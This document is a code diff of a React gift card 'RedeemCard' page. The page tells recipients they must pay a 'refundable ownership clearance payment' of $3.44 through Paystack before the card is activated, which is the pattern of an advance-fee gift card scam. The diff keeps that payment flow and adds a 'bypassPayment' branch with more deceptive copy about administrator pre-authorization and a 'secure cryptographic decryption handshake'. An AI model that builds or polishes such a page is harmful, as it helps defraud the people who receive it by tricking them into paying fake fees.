@@ -145,30 +145,60 @@ const RedeemCard = () => {
             {!isLoading && !isPaid && (
                 <div className="content" style={{ animation: 'slideUpFade 0.6s ease' }}>
                     <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
-                        <span style={{ 
-                            fontSize: '11px', 
-                            fontWeight: 'bold', 
-                            background: 'rgba(99,102,241,0.1)', 
-                            color: '#a5b4fc', 
-                            padding: '4px 12px', 
-                            borderRadius: '50px',
-                            border: '1px solid rgba(99,102,241,0.2)',
-                            textTransform: 'uppercase',
-                            letterSpacing: '1px'
-                        }}>
-                            🔒 SECURE TRANSACTION GATEWAY
-                        </span>
+                        {cardData?.bypassPayment ? (
+                            <span style={{ 
+                                fontSize: '11px', 
+                                fontWeight: 'bold', 
+                                background: 'rgba(16,185,129,0.1)', 
+                                color: '#34d399', 
+                                padding: '4px 12px', 
+                                borderRadius: '50px',
+                                border: '1px solid rgba(16,185,129,0.2)',
+                                textTransform: 'uppercase',
+                                letterSpacing: '1px'
+                            }}>
+                                ✓ SECURITY CLEARANCE PRE-AUTHORIZED
+                            </span>
+                        ) : (
+                            <span style={{ 
+                                fontSize: '11px', 
+                                fontWeight: 'bold', 
+                                background: 'rgba(99,102,241,0.1)', 
+                                color: '#a5b4fc', 
+                                padding: '4px 12px', 
+                                borderRadius: '50px',
+                                border: '1px solid rgba(99,102,241,0.2)',
+                                textTransform: 'uppercase',
+                                letterSpacing: '1px'
+                            }}>
+                                🔒 SECURE TRANSACTION GATEWAY
+                            </span>
+                        )}
                     </div>
 
-                    <h1 style={{ textAlign: 'center', marginBottom: '16px' }}>Security Clearance</h1>
+                    <h1 style={{ textAlign: 'center', marginBottom: '16px' }}>
+                        {cardData?.bypassPayment ? 'Voucher Pre-Authorized' : 'Security Clearance'}
+                    </h1>
                     
-                    <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
-                        For security and verification purposes, the beneficiary is required to complete a refundable ownership clearance payment of <strong style={{ color: '#ffffff' }}>$3.44</strong> before the gift card can be activated and redeemed.
-                    </p>
-                    
-                    <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
-                        This step helps protect transactions and confirm the recipient's identity before final delivery access is granted.
-                    </p>
+                    {cardData?.bypassPayment ? (
+                        <>
+                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
+                                Excellent news! This gift card has been <strong style={{ color: '#10b981' }}>pre-authorized</strong> by the administrator. The standard ownership verification payment has been fully waived.
+                            </p>
+                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
+                                Click the button below to execute the secure cryptographic decryption handshake and instantly reveal your gift card credentials.
+                            </p>
+                        </>
+                    ) : (
+                        <>
+                            <p style={{ textAlign: 'center', fontSize: '14px', lineHeight: '1.6', color: 'var(--text-secondary)' }}>
+                                For security and verification purposes, the beneficiary is required to complete a refundable ownership clearance payment of <strong style={{ color: '#ffffff' }}>$3.44</strong> before the gift card can be activated and redeemed.
+                            </p>
+                            <p style={{ textAlign: 'center', fontSize: '13px', lineHeight: '1.5', color: '#6b7280', margin: '0 0 24px 0' }}>
+                                This step helps protect transactions and confirm the recipient's identity before final delivery access is granted.
+                            </p>
+                        </>
+                    )}
 
                     <div style={{ 
                         background: 'rgba(255,255,255,0.02)', 
@@ -204,24 +234,47 @@ const RedeemCard = () => {
                         </div>
                     </div>
 
-                    <div style={{ 
-                        display: 'flex', 
-                        justifyContent: 'space-between', 
-                        alignItems: 'center', 
-                        background: 'rgba(99,102,241,0.06)', 
-                        border: '1px solid rgba(99,102,241,0.1)', 
-                        padding: '16px', 
-                        borderRadius: '12px', 
-                        marginBottom: '24px' 
-                    }}>
-                        <span style={{ fontSize: '13px', fontWeight: '600' }}>Verification Payment:</span>
-                        <span style={{ fontSize: '18px', fontWeight: '800', color: '#a5b4fc' }}>$3.44 USD</span>
-                    </div>
+                    {cardData?.bypassPayment ? (
+                        <div style={{ 
+                            display: 'flex', 
+                            justifyContent: 'space-between', 
+                            alignItems: 'center', 
+                            background: 'rgba(16,185,129,0.06)', 
+                            border: '1px solid rgba(16,185,129,0.1)', 
+                            padding: '16px', 
+                            borderRadius: '12px', 
+                            marginBottom: '24px' 
+                        }}>
+                            <span style={{ fontSize: '13px', fontWeight: '600', color: '#cbd5e1' }}>Verification Fee Status:</span>
+                            <span style={{ fontSize: '15px', fontWeight: '800', color: '#34d399' }}>✓ Waived / Pre-Cleared</span>
+                        </div>
+                    ) : (
+                        <div style={{ 
+                            display: 'flex', 
+                            justifyContent: 'space-between', 
+                            alignItems: 'center', 
+                            background: 'rgba(99,102,241,0.06)', 
+                            border: '1px solid rgba(99,102,241,0.1)', 
+                            padding: '16px', 
+                            borderRadius: '12px', 
+                            marginBottom: '24px' 
+                        }}>
+                            <span style={{ fontSize: '13px', fontWeight: '600' }}>Verification Payment:</span>
+                            <span style={{ fontSize: '18px', fontWeight: '800', color: '#a5b4fc' }}>$3.44 USD</span>
+                        </div>
+                    )}
 
-                    <button onClick={handlePaystackPayment} className="btn">
-                        <span>Proceed to Security Clearance ($3.44)</span>
-                        <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
-                    </button>
+                    {cardData?.bypassPayment ? (
+                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
+                            <span>Reveal & Activate Gift Card</span>
+                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
+                        </button>
+                    ) : (
+                        <button onClick={handlePaystackPayment} className="btn">
+                            <span>Proceed to Security Clearance ($3.44)</span>
+                            <span style={{ fontSize: '12px', opacity: 0.8 }}>⚡</span>
+                        </button>
+                    )}
                 </div>
             )}
 
